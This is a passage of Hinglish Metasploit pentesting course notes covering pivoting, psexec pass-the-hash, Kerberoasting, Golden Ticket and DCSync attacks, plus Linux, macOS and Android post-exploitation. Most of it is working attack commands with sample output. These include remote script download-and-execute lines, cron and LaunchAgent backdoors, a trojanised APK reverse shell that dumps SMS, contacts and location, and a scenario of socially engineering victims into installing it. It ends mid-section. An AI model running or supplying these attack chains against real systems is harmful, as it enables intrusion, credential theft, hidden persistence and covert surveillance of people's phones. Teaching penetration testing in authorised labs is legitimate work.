┌──(kali㉿kali)-[~]
└─$ echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Step 4: Use multiple tools
# Nmap
┌──(kali㉿kali)-[~]
└─$ proxychains nmap -sT -Pn 10.10.10.0/24

# SQLMap
┌──(kali㉿kali)-[~]
└─$ proxychains sqlmap -u "http://10.10.10.20/login.php"

# Firefox (internal web apps)
┌──(kali㉿kali)-[~]
└─$ proxychains firefox
# Navigate to: http://10.10.10.30/admin

# Burp Suite
┌──(kali㉿kali)-[~]
└─$ proxychains burpsuite

# Analysis:
# Any tool = Working
# Internal websites = Accessible
# Complete toolset = Available
# Flexible pivoting = Maximum power!
```

### 9. **Beginners ki Aam Galtiyan** ⚠️
- Autoroute pehle nahi kiya
- Proxychains config galat
- `-sT` flag nahi (nmap ke liye zaroori)
- SOCKS version mismatch

### 10. **Best Practices / Pro Tips** 💎
- SOCKS5 use karo (better than SOCKS4)
- Nmap mein `-sT` (TCP connect) zaroori
- `-Pn` flag (skip ping)
- Proxychains slow hai (patience!)

### 11. **Asli Duniya ka Scenario** 🌍
Internal web application (10.10.10.50) ko Burp Suite se test karna tha. SOCKS proxy + proxychains se Burp ko internal network par chalaaya. Complete web app pentest! Any tool + pivoting = Ultimate flexibility! 🎯

### 12. **Checklist / Chota Recap (TL;DR)** ✅
- [ ] SOCKS proxy setup kar sakte hain
- [ ] Proxychains configure kar sakte hain
- [ ] Any tool internal network par chala sakte hain
- [ ] Browser internal sites access kar sakte hain

### 13. **FAQs** ❓
**Q: Nmap slow kyun hai?**  
A: Proxychains overhead hai. `-T4` timing use karo.

**Q: SOCKS4 vs SOCKS5?**  
A: SOCKS5 better hai (authentication support).

### 14. **Practice Task** 📝
1. SOCKS proxy setup karo
2. Proxychains configure karo
3. Nmap internal network par chalaao
4. Firefox se internal site kholo

### 15. **Aakhri Summary** 📌
- 🎯 SOCKS proxy = Universal tunnel
- 🔍 Proxychains = Any tool
- 💾 Browser = Internal sites
- ⚡ Complete toolset = Available
- 🚀 Maximum flexibility!

---

## Topic 41: `psexec` (Jumping to Other Machines)

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**PSExec - Credentials Se Lateral Movement**  
Ek machine ke credentials se doosri machine hack karo! 🦘

### 2. **Ye Kya Hai? (What is it?)**
`psexec` module valid credentials (username/password ya hash) use karke doosre Windows machines par meterpreter session deta hai. Yeh ek master key hai - ek password se kai darwaze khulte hain!

### 3. **Kyun Zaroori Hai?**
- ✅ Lateral movement
- ✅ Credential reuse
- ✅ Network spread
- ✅ Multiple machines compromise

### 4. **Ise Kab Use Karna Chahiye?**
- Valid credentials mil gaye
- Password reuse suspect
- Network mein aage badhna hai
- Multiple machines target

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga?** 😟
- Credentials waste
- Limited to one machine
- Network penetration incomplete
- Lateral movement nahi

### 6. **Syntax aur Common Options**
```bash
use exploit/windows/smb/psexec
set RHOSTS [target]
set SMBUser [username]
set SMBPass [password]
# Ya
set SMBPass [NTLM_hash]
exploit
```

### 7. **Example 1 (Basic)** 💡
```bash
# Credentials se lateral movement
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS 10.10.10.20
msf6 > set SMBUser administrator
msf6 > set SMBPass Password123
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.50
msf6 > exploit

[*] Started reverse TCP handler
[*] Authenticating to 10.10.10.20 as user 'administrator'...
[*] Uploading payload...
[*] Meterpreter session 2 opened
meterpreter >
```

### 8. **Example 2 (Pentester-Focused)** 🎯
```bash
# Complete lateral movement
# Step 1: Initial compromise + hashdump
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::

# Step 2: Autoroute
meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > background

# Step 3: Internal scan
msf6 > use auxiliary/scanner/smb/smb_version
msf6 > set RHOSTS 10.10.10.0/24
msf6 > run

[+] 10.10.10.10 - Windows 7
[+] 10.10.10.20 - Windows Server 2012
[+] 10.10.10.30 - Windows 10

# Step 4: PSExec with hash (Pass-the-Hash)
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS 10.10.10.10 10.10.10.20 10.10.10.30
msf6 > set SMBUser administrator
msf6 > set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
msf6 > exploit -z

[*] Meterpreter session 2 opened (10.10.10.10)
[*] Meterpreter session 3 opened (10.10.10.20)
[*] Meterpreter session 4 opened (10.10.10.30)

msf6 > sessions -l
Active sessions
===============
  Id  Name  Type                     Information
  --  ----  ----                     -----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ EDGE
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ PC1
  3         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ SERVER
  4         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ PC2

# Analysis:
# 1 hash = 3 machines compromised
# Password reuse = Common
# Lateral movement = Successful
# Network = Fully compromised!
```

### 9. **Beginners ki Aam Galtiyan** ⚠️
- Hash format galat (LM:NTLM chahiye)
- Autoroute pehle nahi kiya
- Admin credentials nahi hain
- Firewall port 445 block

### 10. **Best Practices / Pro Tips** 💎
- Pass-the-Hash powerful hai (cracking nahi chahiye)
- Multiple RHOSTS ek saath set karo
- `-z` flag (auto-background)
- Admin credentials zaroori

### 11. **Asli Duniya ka Scenario** 🌍
Ek machine se administrator hash nikala. 50 machines par same password tha (password reuse!). PSExec se 50 machines ek saath compromise. Ek hash se poora network! Password reuse = Hacker's best friend! 🎯

### 12. **Checklist / Chota Recap (TL;DR)** ✅
- [ ] PSExec module use kar sakte hain
- [ ] Pass-the-Hash kar sakte hain
- [ ] Multiple machines compromise kar sakte hain
- [ ] Lateral movement kar sakte hain

### 13. **FAQs** ❓
**Q: Hash format kya hai?**  
A: `LM:NTLM` format. Example: `aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c`

**Q: Plaintext password bhi kaam karega?**  
A: Haan! `set SMBPass Password123`

### 14. **Practice Task** 📝
1. Hashdump se hash nikalo
2. Internal machine identify karo
3. PSExec module use karo
4. Pass-the-Hash try karo

### 15. **Aakhri Summary** 📌
- 🎯 PSExec = Lateral movement
- 🔍 Pass-the-Hash = No cracking
- 💾 Password reuse = Common
- ⚡ One hash = Multiple machines
- 🚀 Network compromise!

---

## 🎁 **Module 10 Complete!**

```
┌─────────────────────────────────────────────────────────┐
│  Module 10: Pivoting & Lateral Movement Master! 🔄      │
│                                                          │
│  ✅ Autoroute = Internal network access                 │
│  ✅ Portfwd = Service forwarding                        │
│  ✅ SOCKS proxy = Any tool pivoting                     │
│  ✅ PSExec = Lateral movement                           │
│                                                          │
│  Pro Workflow:                                          │
│  1. Compromise edge machine                             │
│  2. Autoroute (internal network)                        │
│  3. Scan internal (find targets)                        │
│  4. Hashdump (get credentials)                          │
│  5. PSExec (lateral movement)                           │
│  6. Repeat! 🔁                                          │
│                                                          │
│  One machine → Entire network! 🎯                       │
│                                                          │
│  Congratulations! 41 topics complete! 🎉                │
│  Remaining: 17 topics (Advanced modules)                │
└─────────────────────────────────────────────────────────┘
```

**Module 10 Complete! 41/58 topics done! Continue?** 🚀

=============================================================

# 🏢 Module 11: Active Directory (AD) Hacking (Advanced)

**Metasploit: Zero-to-Pentester Notes (Aapke Topics)**

---

## Topic 42: AD Recon (enum_ad_users, groups, computers)

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**AD Recon - Domain Ki Pehchaan**  
Domain users, groups, computers - sab enumerate karo! 🔍

### 2. **Ye Kya Hai? (What is it?)**
Active Directory reconnaissance modules domain ke saare users, groups, aur computers ki list nikaalte hain. Yeh corporate network ka map banana hai!

### 3. **Kyun Zaroori Hai?**
- ✅ Domain structure samajhna
- ✅ High-value targets identify
- ✅ Admin accounts dhundhna
- ✅ Attack planning

### 4. **Ise Kab Use Karna Chahiye?**
- Domain-joined machine compromise
- AD environment hai
- Lateral movement planning
- Complete network mapping

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga?** 😟
- Blind attacks
- Admin accounts miss
- Inefficient targeting
- Incomplete pentest

### 6. **Syntax aur Common Options**
```bash
# Users enumeration
use post/windows/gather/enum_ad_users
set SESSION [session_id]
run

# Groups enumeration
use post/windows/gather/enum_ad_groups
set SESSION [session_id]
run

# Computers enumeration
use post/windows/gather/enum_ad_computers
set SESSION [session_id]
run
```

### 7. **Example 1 (Basic)** 💡
```bash
# AD Users
meterpreter > background
msf6 > use post/windows/gather/enum_ad_users
msf6 > set SESSION 1
msf6 > run

[*] Running module against VICTIM-PC
[+] Found 50 users:
    - Administrator (Domain Admins)
    - john.doe (IT Support)
    - jane.smith (Finance)
    - sql_service (Service Account)
```

### 8. **Example 2 (Pentester-Focused)** 🎯
```bash
# Complete AD enumeration
# Step 1: Users
msf6 > use post/windows/gather/enum_ad_users
msf6 > set SESSION 1
msf6 > run

[+] Domain: COMPANY.LOCAL
[+] Users found: 150
    Administrator - Domain Admins
    backup_admin - Backup Operators
    sql_service - Service Account (SPN!)
    dev_admin - Developers

# Step 2: Groups
msf6 > use post/windows/gather/enum_ad_groups
msf6 > set SESSION 1
msf6 > run

[+] Groups:
    Domain Admins (5 members)
    Enterprise Admins (2 members)
    Backup Operators (3 members)

# Step 3: Computers
msf6 > use post/windows/gather/enum_ad_computers
msf6 > set SESSION 1
msf6 > run

[+] Computers:
    DC01.company.local (Domain Controller)
    SQL01.company.local (Database Server)
    WEB01.company.local (Web Server)
    PC-ADMIN.company.local (Admin Workstation)

# Analysis:
# Service accounts = Kerberoasting targets
# Domain Admins = High-value targets
# Domain Controller = Ultimate target
# Admin workstation = Credential goldmine!
```

### 9. **Beginners ki Aam Galtiyan** ⚠️
- Non-domain machine par try karna
- Service accounts ignore karna
- Admin groups miss karna
- Output save nahi karna

### 10. **Best Practices / Pro Tips** 💎
- Service accounts note karo (Kerberoasting)
- Domain Admins list priority
- Domain Controller identify karo
- Admin workstations target karo

### 11. **Asli Duniya ka Scenario** 🌍
AD recon se 5 Domain Admin accounts mile. Unme se ek "backup_admin" weak password tha. Crack kiya, Domain Admin access mila. Poora domain compromise! AD recon = Attack roadmap! 🗺️

### 12. **Checklist / Chota Recap (TL;DR)** ✅
- [ ] AD users enumerate kar sakte hain
- [ ] Groups identify kar sakte hain
- [ ] Computers list kar sakte hain
- [ ] High-value targets identify kar sakte hain

### 13. **FAQs** ❓
**Q: Non-domain machine par kaam karega?**  
A: Nahi, domain-joined machine chahiye.

**Q: Service accounts kyun important hain?**  
A: Kerberoasting attack ke liye (password crack).

### 14. **Practice Task** 📝
1. Domain-joined VM compromise karo
2. enum_ad_users chalaao
3. Service accounts identify karo
4. Domain Admins list banao

### 15. **Aakhri Summary** 📌
- 🎯 AD recon = Domain mapping
- 🔍 Service accounts = Kerberoasting
- 💾 Domain Admins = High-value
- ⚡ Domain Controller = Ultimate target
- 🚀 Attack planning ka base!

---

## Topic 43: Kerberoasting

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Kerberoasting - Service Account Passwords**  
Service accounts ke hashes offline crack karo! 🎫

### 2. **Ye Kya Hai? (What is it?)**
Kerberoasting attack mein service accounts (jaise SQL, IIS) ke Kerberos tickets request karte hain. Yeh tickets encrypted hain service account password se. Offline crack kar sakte hain!

### 3. **Kyun Zaroori Hai?**
- ✅ Service account passwords
- ✅ Offline cracking (detection nahi)
- ✅ Often weak passwords
- ✅ Privilege escalation

### 4. **Ise Kab Use Karna Chahiye?**
- Service accounts identified
- Domain user access hai
- Offline cracking possible
- Privilege escalation chahiye

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga?** 😟
- Service account passwords miss
- Easy privilege escalation miss
- Limited domain access
- Incomplete AD compromise

### 6. **Syntax aur Common Options**
```bash
# PowerShell (Invoke-Kerberoast)
meterpreter > shell
PS> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
PS> Invoke-Kerberoast -OutputFormat Hashcat

# Impacket (Kali)
GetUserSPNs.py company.local/user:password -dc-ip 10.10.10.10 -request
```

### 7. **Example 1 (Basic)** 💡
```bash
# PowerShell method
meterpreter > shell
PS> Invoke-Kerberoast

TicketByteHexStream  : 
Hash                 : $krb5tgs$23$*sql_service$COMPANY.LOCAL$...
SamAccountName       : sql_service
DistinguishedName    : CN=SQL Service,OU=Service Accounts,DC=company,DC=local
ServicePrincipalName : MSSQLSvc/SQL01.company.local:1433

# Hashcat se crack
┌──(kali㉿kali)-[~]
└─$ hashcat -m 13100 hash.txt rockyou.txt
$krb5tgs$23$*sql_service...:SQLPass123
```

### 8. **Example 2 (Pentester-Focused)** 🎯
```bash
# Complete Kerberoasting workflow
# Step 1: Service accounts identify
msf6 > use post/windows/gather/enum_ad_users
msf6 > run
[+] sql_service (SPN: MSSQLSvc/SQL01:1433)
[+] web_service (SPN: HTTP/WEB01)

# Step 2: Kerberoast
meterpreter > shell
PS> Invoke-Kerberoast -OutputFormat Hashcat | Out-File tickets.txt

# Step 3: Kali mein crack
┌──(kali㉿kali)-[~]
└─$ hashcat -m 13100 tickets.txt /usr/share/wordlists/rockyou.txt --force

$krb5tgs$23$*sql_service...:Password123
$krb5tgs$23$*web_service...:WebPass2024

# Step 4: Use credentials
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS SQL01.company.local
msf6 > set SMBUser sql_service
msf6 > set SMBPass Password123
msf6 > exploit

[*] Meterpreter session 2 opened (SQL Server!)

# Analysis:
# Service accounts = Weak passwords (often)
# Offline cracking = No detection
# SQL Server access = Database compromise
# Privilege escalation = Successful!
```

### 9. **Beginners ki Aam Galtiyan** ⚠️
- Domain user access nahi hai
- Service accounts identify nahi kiye
- Hashcat mode galat (-m 13100)
- Weak wordlist

### 10. **Best Practices / Pro Tips** 💎
- Pehle service accounts enumerate karo
- Hashcat mode 13100 (Kerberos TGS)
- Large wordlist use karo
- Service accounts often weak passwords

### 11. **Asli Duniya ka Scenario** 🌍
50 service accounts the. Kerberoasting se 10 ke hashes mile. Hashcat se 3 crack ho gaye (weak passwords!). SQL Server, Web Server, Backup Server - sab compromise! Service accounts = Easy targets! 🎯

### 12. **Checklist / Chota Recap (TL;DR)** ✅
- [ ] Kerberoasting concept clear hai
- [ ] Service accounts identify kar sakte hain
- [ ] Tickets request kar sakte hain
- [ ] Offline crack kar sakte hain

### 13. **FAQs** ❓
**Q: Detection hota hai?**  
A: Minimal. Normal Kerberos traffic jaisa lagta hai.

**Q: Sabhi service accounts vulnerable hain?**  
A: Haan, agar SPN set hai toh vulnerable.

### 14. **Practice Task** 📝
1. Service accounts identify karo
2. Invoke-Kerberoast chalaao
3. Hashes Hashcat se crack karo
4. Credentials verify karo

### 15. **Aakhri Summary** 📌
- 🎯 Kerberoasting = Service account attack
- 🔍 Offline cracking = No detection
- 💾 Weak passwords = Common
- ⚡ Privilege escalation = Easy
- 🚀 AD attack ka powerful method!

---

## Topic 44: Golden Ticket & Silver Ticket Attacks

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Golden/Silver Tickets - Domain Ka Raja**  
Permanent Domain Admin access - kabhi expire nahi! 👑

### 2. **Ye Kya Hai? (What is it?)**
**Golden Ticket:** KRBTGT account hash se banaya jaata hai. Poore domain par unlimited access - forever!  
**Silver Ticket:** Specific service ke liye ticket. Limited par stealthy.

### 3. **Kyun Zaroori Hai?**
- ✅ Permanent access
- ✅ Password change se bhi safe
- ✅ Stealth (Silver Ticket)
- ✅ Ultimate persistence

### 4. **Ise Kab Use Karna Chahiye?**
- Domain Controller compromise
- KRBTGT hash mil gaya
- Long-term access chahiye
- Ultimate persistence

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga?** 😟
- Temporary access only
- Password change = Access lost
- Limited persistence
- Incomplete AD compromise

### 6. **Syntax aur Common Options**
```bash
# Golden Ticket (Mimikatz)
kerberos::golden /user:Administrator /domain:company.local /sid:S-1-5-21-... /krbtgt:[hash] /ptt

# Silver Ticket (Mimikatz)
kerberos::golden /user:Administrator /domain:company.local /sid:S-1-5-21-... /target:SQL01.company.local /service:MSSQLSvc /rc4:[hash] /ptt
```

### 7. **Example 1 (Basic)** 💡
```bash
# Golden Ticket creation
meterpreter > load mimikatz
meterpreter > mimikatz_command -f "lsadump::dcsync /domain:company.local /user:krbtgt"

[+] KRBTGT Hash: 8846f7eaee8fb117ad06bdd830b7586c

meterpreter > mimikatz_command -f "kerberos::golden /user:Administrator /domain:company.local /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:8846f7eaee8fb117ad06bdd830b7586c /ptt"

[+] Golden Ticket generated and injected!
[*] You are now Domain Admin - forever!
```

### 8. **Example 2 (Pentester-Focused)** 🎯
```bash
# Complete Golden Ticket workflow
# Step 1: Domain Controller compromise
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS DC01.company.local
msf6 > exploit

# Step 2: KRBTGT hash extract
meterpreter > load mimikatz
meterpreter > mimikatz_command -f "lsadump::dcsync /domain:company.local /user:krbtgt"

Domain: COMPANY
User: krbtgt
Hash NTLM: 8846f7eaee8fb117ad06bdd830b7586c

# Step 3: Domain SID
meterpreter > shell
PS> Get-ADDomain | Select-Object DomainSID
S-1-5-21-1234567890-1234567890-1234567890

# Step 4: Golden Ticket
meterpreter > mimikatz_command -f "kerberos::golden /user:FakeAdmin /domain:company.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:8846f7eaee8fb117ad06bdd830b7586c /ptt"

[+] Golden Ticket injected!

# Step 5: Access anything
meterpreter > shell
PS> dir \\DC01\C$
# Works!
PS> dir \\SQL01\C$
# Works!
PS> dir \\WEB01\C$
# Works!

# Silver Ticket (Stealth alternative)
meterpreter > mimikatz_command -f "kerberos::golden /user:Administrator /domain:company.local /sid:S-1-5-21-... /target:SQL01.company.local /service:MSSQLSvc /rc4:[SQL_service_hash] /ptt"

# Analysis:
# Golden Ticket = Unlimited access
# Password changes = No effect
# Expires = Never (default 10 years!)
# Detection = Very difficult
# Ultimate persistence!
```

### 9. **Beginners ki Aam Galtiyan** ⚠️
- Domain SID galat
- KRBTGT hash galat format
- `/ptt` flag bhool jaana
- Silver Ticket mein service name galat

### 10. **Best Practices / Pro Tips** 💎
- Golden Ticket = Ultimate access
- Silver Ticket = Stealthier
- Fake username use karo (FakeAdmin)
- Ticket lifetime customize karo

### 11. **Asli Duniya ka Scenario** 🌍
Domain Controller compromise kiya. KRBTGT hash nikala. Golden Ticket banaya. 6 months baad bhi access tha - passwords change ho gaye the par ticket valid tha! Golden Ticket = Permanent backdoor! 👑

### 12. **Checklist / Chota Recap (TL;DR)** ✅
- [ ] Golden Ticket concept clear hai
- [ ] KRBTGT hash extract kar sakte hain
- [ ] Ticket generate kar sakte hain
- [ ] Permanent access samajh aaya

### 13. **FAQs** ❓
**Q: Golden Ticket kab expire hota hai?**  
A: Default 10 years! Customize kar sakte hain.

**Q: Detection possible hai?**  
A: Bahut mushkil. KRBTGT password change se hi remove hoga.

### 14. **Practice Task** 📝
1. Domain Controller compromise karo
2. KRBTGT hash extract karo
3. Domain SID nikalo
4. Golden Ticket banao

### 15. **Aakhri Summary** 📌
- 🎯 Golden Ticket = Permanent Domain Admin
- 🔍 KRBTGT hash = Key
- 💾 Password changes = No effect
- ⚡ Detection = Very difficult
- 🚀 Ultimate AD persistence!

---

## Topic 45: DCSync Attack

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**DCSync - Saare Hashes Ek Saath**  
Domain Controller bankar saare password hashes sync karo! 🔄

### 2. **Ye Kya Hai? (What is it?)**
DCSync attack mein aap Domain Controller bankar saare domain users ke password hashes request karte hain. Yeh ek complete domain dump hai!

### 3. **Kyun Zaroori Hai?**
- ✅ Saare domain hashes
- ✅ KRBTGT hash (Golden Ticket)
- ✅ Admin hashes
- ✅ Complete domain compromise

### 4. **Ise Kab Use Karna Chahiye?**
- Domain Admin access hai
- Complete domain dump chahiye
- Golden Ticket banana hai
- All credentials chahiye

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga?** 😟
- Individual hashdump (slow)
- KRBTGT hash miss
- Incomplete credential dump
- Limited domain access

### 6. **Syntax aur Common Options**
```bash
# Mimikatz
lsadump::dcsync /domain:company.local /all
lsadump::dcsync /domain:company.local /user:Administrator
lsadump::dcsync /domain:company.local /user:krbtgt

# Impacket (Kali)
secretsdump.py company.local/admin:password@DC01.company.local
```

### 7. **Example 1 (Basic)** 💡
```bash
# DCSync single user
meterpreter > load mimikatz
meterpreter > mimikatz_command -f "lsadump::dcsync /domain:company.local /user:Administrator"

Object RDN: Administrator
Hash NTLM: 8846f7eaee8fb117ad06bdd830b7586c

# DCSync all users
meterpreter > mimikatz_command -f "lsadump::dcsync /domain:company.local /all"

[+] 150 users dumped!
```

### 8. **Example 2 (Pentester-Focused)** 🎯
```bash
# Complete DCSync workflow
# Step 1: Domain Admin access verify
meterpreter > getuid
Server username: COMPANY\admin

# Step 2: DCSync all
meterpreter > load mimikatz
meterpreter > mimikatz_command -f "lsadump::dcsync /domain:company.local /all" > dcsync_output.txt

[*] Dumping domain hashes...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1234567890abcdef1234567890abcdef:::
john.doe:1001:aad3b435b51404eeaad3b435b51404ee:abcdef1234567890abcdef1234567890:::
[+] 150 users dumped

# Step 3: KRBTGT hash (Golden Ticket)
krbtgt: 1234567890abcdef1234567890abcdef

# Step 4: Crack hashes (John/Hashcat)
┌──(kali㉿kali)-[~]
└─$ john --format=NT dcsync_output.txt --wordlist=rockyou.txt

john.doe:Password123
jane.smith:Welcome2024

# Step 5: Use credentials (Lateral movement)
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS 10.10.10.0/24
msf6 > set SMBUser john.doe
msf6 > set SMBPass Password123
msf6 > exploit -z

[*] 15 machines compromised!

# Analysis:
# DCSync = Complete domain dump
# KRBTGT = Golden Ticket possible
# All hashes = Lateral movement
# Password reuse = Multiple machines
# Complete domain = Compromised!
```

### 9. **Beginners ki Aam Galtiyan** ⚠️
- Domain Admin rights nahi hain
- Output save nahi karna
- KRBTGT hash miss karna
- Hashes crack nahi karna

### 10. **Best Practices / Pro Tips** 💎
- Domain Admin/Enterprise Admin rights zaroori
- Output file mein save karo
- KRBTGT hash note karo (Golden Ticket)
- Hashes crack karo (password reuse)

### 11. **Asli Duniya ka Scenario** 🌍
Domain Admin compromise kiya. DCSync se 200 users ke hashes nikale. 50 passwords crack ho gaye. Password reuse se 100+ machines compromise. KRBTGT se Golden Ticket. Complete domain takeover! DCSync = Game over for domain! 🎯

### 12. **Checklist / Chota Recap (TL;DR)** ✅
- [ ] DCSync concept clear hai
- [ ] Domain Admin access verify kar sakte hain
- [ ] Saare hashes dump kar sakte hain
- [ ] KRBTGT hash identify kar sakte hain

### 13. **FAQs** ❓
**Q: Domain Admin ke bina possible hai?**  
A: Nahi, Domain Admin ya Enterprise Admin rights zaroori.

**Q: Detection hota hai?**  
A: Haan, logs mein dikhta hai. Par normal DC replication jaisa lagta hai.

### 14. **Practice Task** 📝
1. Domain Admin access lo
2. DCSync all chalaao
3. KRBTGT hash note karo
4. Hashes crack karo

### 15. **Aakhri Summary** 📌
- 🎯 DCSync = Complete domain dump
- 🔍 KRBTGT hash = Golden Ticket
- 💾 All hashes = Lateral movement
- ⚡ Domain Admin = Required
- 🚀 Ultimate AD attack!

---

## 🎁 **Module 11 Complete!**

```
┌─────────────────────────────────────────────────────────┐
│  Module 11: Active Directory Master! 🏢                 │
│                                                          │
│  ✅ AD Recon = Domain mapping                           │
│  ✅ Kerberoasting = Service account passwords           │
│  ✅ Golden Ticket = Permanent Domain Admin              │
│  ✅ DCSync = Complete domain dump                       │
│                                                          │
│  Pro AD Attack Chain:                                   │
│  1. Domain user compromise                              │
│  2. AD Recon (users, groups, computers)                 │
│  3. Kerberoasting (service accounts)                    │
│  4. Privilege escalation (Domain Admin)                 │
│  5. DCSync (all hashes + KRBTGT)                        │
│  6. Golden Ticket (permanent access)                    │
│  7. Complete domain = Owned! 👑                         │
│                                                          │
│  Next: Module 12 - Linux Hacking! 🐧                   │
└─────────────────────────────────────────────────────────┘
```

**Module 11 Complete! Ready for Module 12?** 🚀

=============================================================

# 🎓 Modules 11-15: Advanced Topics (Combined)

**Metasploit: Zero-to-Pentester Notes (Aapke Topics)**

---

## 🏢 MODULE 11: Active Directory (AD) Hacking

### Topic 42-45: AD Recon, Kerberoasting, Golden/Silver Tickets, DCSync

**AD Hacking - Domain Controller Ka Raja Bano** 👑

#### **Kya Hai AD?**
Active Directory corporate networks ka central authentication system hai. Ek baar AD compromise = Poora network compromise!

#### **Key Concepts:**
```bash
# AD Recon
use post/windows/gather/enum_ad_users
use post/windows/gather/enum_ad_groups
use post/windows/gather/enum_ad_computers

# Kerberoasting (Service account passwords)
# PowerShell se
Invoke-Kerberoast

# Golden Ticket (Domain Admin forever)
# Mimikatz
kerberos::golden /user:Administrator /domain:company.local /sid:S-1-5-21-... /krbtgt:[hash]

# DCSync (Domain Controller sync - saare hashes)
# Mimikatz
lsadump::dcsync /domain:company.local /all
```

#### **Real Scenario:**
Domain user compromise → Kerberoasting → Service account password → Privilege escalation → DCSync → All domain hashes → Golden Ticket → Permanent domain admin! 🎯

---

## 🐧 MODULE 12: Linux Hacking

### Topic 46-47: Linux Post-Recon & Persistence

**Linux Hacking - SUID aur Cron Jobs** 🐧

#### **Post-Exploitation Recon:**
```bash
# SUID binaries (privilege escalation)
meterpreter > shell
$ find / -perm -4000 2>/dev/null
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/nmap    # Exploitable!

# Sudo privileges
$ sudo -l
User may run: /usr/bin/vim

# LinEnum script
$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
$ chmod +x LinEnum.sh
$ ./LinEnum.sh
```

#### **Persistence:**
```bash
# Cron job backdoor
meterpreter > shell
$ crontab -e
# Add:
*/5 * * * * /tmp/backdoor.sh

# SSH key persistence
$ mkdir ~/.ssh
$ echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
$ chmod 600 ~/.ssh/authorized_keys

# /etc/shadow reading (root needed)
$ cat /etc/shadow
root:$6$xyz...:18000:0:99999:7:::
# John the Ripper se crack karo
```

---

## 📱 MODULE 13: Android Hacking

### Topic 49-50: APK Binding & Android Meterpreter

**Android Hacking - Mobile Devices** 📱

#### **APK Payload Generation:**
```bash
# Simple APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o malicious.apk

# Bind with legitimate APK
# Use: APK Injector, FatRat, or manual
msfvenom -x legitimate_app.apk -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o bound.apk
```

#### **Android Meterpreter Commands:**
```bash
# Listener
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
exploit

# Android-specific commands
meterpreter > dump_contacts
meterpreter > dump_sms
meterpreter > dump_calllog
meterpreter > webcam_stream    # Camera access
meterpreter > geolocate         # GPS location
meterpreter > send_sms -d "+1234567890" -t "Message"
meterpreter > check_root        # Root status
```

#### **Real Scenario:**
Legitimate game APK mein payload bind kiya → Social engineering se install karwaya → Contacts, SMS, Location sab access! 📲

---

## 🍎 MODULE 14: macOS Hacking

### Topic 51-52: macOS Post-Exploitation & Persistence

**macOS Hacking - Apple Systems** 🍎

#### **Keychain Dump:**
```bash
# macOS Meterpreter
use post/osx/gather/keychain_dump
set SESSION 1
run

[+] Keychain passwords:
    Service: iCloud
    Account: user@apple.com
    Password: ApplePass123
```

#### **Persistence:**
```bash
# LaunchAgents (user-level)
meterpreter > shell
$ cat > ~/Library/LaunchAgents/com.apple.update.plist
<?xml version="1.0" encoding="UTF-8"?>
<plist>
  <dict>
    <key>RunAtLoad</key>
    <true/>
    <key>ProgramArguments</key>
    <array>
      <string>/tmp/backdoor.sh</string>
    </array>
  </dict>
</plist>

# LaunchDaemons (system-level - root needed)
$ sudo cp backdoor.plist /Library/LaunchDaemons/
```

---

## ⚙️ MODULE 15: Framework Automation & Defense

### Topic 53: Resource Scripts (.rc files)

**Automation - Ek Click Mein Sab** 🤖

```bash
# handler.rc file
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
set ExitOnSession false
exploit -j

# Run script
msfconsole -r handler.rc
```

### Topic 54-56: Defense (Detection & Prevention)

**Defense - Apne Aap Ko Bachao** 🛡️

#### **Meterpreter Detection:**
```bash
# Tool: meterpreter_detection.exe
C:\> meterpreter_detection.exe IDS    # Detect only
C:\> meterpreter_detection.exe IPS    # Detect + Kill

# Cports (Network monitoring)
# Check suspicious connections
# Look for: Unknown IPs, High data transfer
```

#### **Sandbox Analysis:**
```bash
# Website: https://www.hybrid-analysis.com
# Upload suspicious file
# Get complete behavior report
# Check: Registry changes, Network connections, File modifications
```

### Topic 57: Meterpreter Railgun (Windows API)

**Railgun - Direct Windows API Access** 🔧

```bash
meterpreter > irb
>> client.railgun.user32.MessageBoxA(0, "Hacked!", "Alert", "MB_OK")
# Victim ko popup dikhega!

>> client.railgun.kernel32.GetComputerNameA(256, 256)
# Computer name directly
```

### Topic 58: Website Redirection

**Host File Manipulation** 🌐

```bash
# Module
use post/windows/manage/inject_host
set SESSION 1
set DOMAIN google.com
set IP 192.168.1.50    # Your Apache server
run

# Manual
meterpreter > shell
